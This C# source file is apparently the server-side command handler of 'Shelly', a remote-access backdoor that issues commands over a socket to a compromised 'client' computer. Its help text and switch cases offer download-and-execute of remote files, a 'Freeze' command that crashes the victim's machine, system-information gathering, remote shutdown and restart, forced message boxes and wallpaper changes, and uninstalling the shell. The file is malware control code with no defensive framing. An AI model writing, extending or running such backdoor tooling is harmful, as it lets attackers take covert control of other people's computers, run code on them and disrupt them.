using System;

namespace Shelly_Server
{
    class InputOutput
    {
        public static void IO(string UserIO)
        {
            string Command = UserIO.ToLower();
            string CommandPS = Command + " ";

            // Turn to lower case and handle it
            switch (Command)
            {
                // Shows help section
                case "help":
                    Console.WriteLine(
                        "SERVER COMMANDS\n" +
                        "1. Help - Displays this help section\n" + // None client
                        "2. Clear - Clears the console\n" + // None client
                        "3. Exit - Exits\n\n" +

                        "GENERAL\n" +

                        "1. Uninstall - Uninstalls Shelly from the client computer\n" +
                        "2. Disconnect - Shuts down the shell until next system startup\n" +
                        "3. Ping - Pings the client and shows the response\n" + 
                        "4. MessageBox - Shows a messagebox on the clients computer\n" +
                        "5. DownloadAndExecute - Downloads and executes a file\n" +
                        "6. OpenWebsite - Opens a website using the IE browser\n" +
                        "7. Info - Shows client system information\n\n" +

                        "FUN\n" +
                        "1. ChangeWallpaper - Changes client desktop wallpaper\n" +
                        "2. Freeze - Freezes and eventually crashes the client computer\n\n" +

                        "POWER OPTIONS\n" +

                        "1. Shutdown\n" +
                        "2. Restart\n" +
                        "3. hibernate"
                    );
                    break;

                // Clears the console
                case "clear":
                    Console.Clear();
                    break;

                // Exit
                case "exit":

                    // Disconnect and exit
                    SocketHandler.ShutdownServer();
                    break;

                // Uninstall shell
                case "uninstall":

                    // Send message
                    SocketHandler.Send(Command);

                    // Disconnect and exit
                    SocketHandler.ShutdownServer();
                    break;

                // Uninstall shell
                case "disconnect":

                    // Send message
                    SocketHandler.Send(Command);

                    // Disconnect and exit
                    SocketHandler.ShutdownServer();
                    break;


                // Request Ping from client
                case "ping":

                    // Send message
                    SocketHandler.Send(Command);

                    // Receive response
                    Console.WriteLine(SocketHandler.Receive());
                    break;

                // Show messagebox
                case "messagebox":

                    // Send message
                    SocketHandler.Send(CommandPS + Functions.UserInput.GetMessageBoxInput());
                    break;

                // Download and execute
                case "downloadandexecute":

                    // Send message
                    SocketHandler.Send(CommandPS + Functions.UserInput.GetLinkInput(1));
                    break;

                // Open website
                case "openwebsite":

                    // Send message
                    SocketHandler.Send(CommandPS + Functions.UserInput.GetLinkInput(3));
                    break;

                // Get client info
                case "info":

                    // Send message
                    SocketHandler.Send(Command);

                    // Get response
                    Console.WriteLine(SocketHandler.Receive());
                    break;

                // Change wallpaper
                case "changewallpaper":

                    // Send message
                    SocketHandler.Send(CommandPS + Functions.UserInput.GetLinkInput(2));
                    break;

                // Freeze
                case "freeze":

                    // Send message
                    SocketHandler.Send(Command);

                    // Disconnect and exit
                    SocketHandler.ShutdownServer();
                    break;

                // Shutdown client computer
                case "shutdown":

                    // Send message
                    SocketHandler.Send(Command);

                    // Disconnect and exit
                    SocketHandler.ShutdownServer();
                    break;

                // Restart client computer
                case "restart":

                    // Send message
                    SocketHandler.Send(Command);

                    // Disconnect and exit
                    SocketHandler.ShutdownServer();
                    break;

                // Hibernate client computer
                case "hibernate":

                    // Send message
                    SocketHandler.Send(Command);

                    // Disconnect and exit
                    SocketHandler.ShutdownServer();
                    break;
            }
        }
    }
}
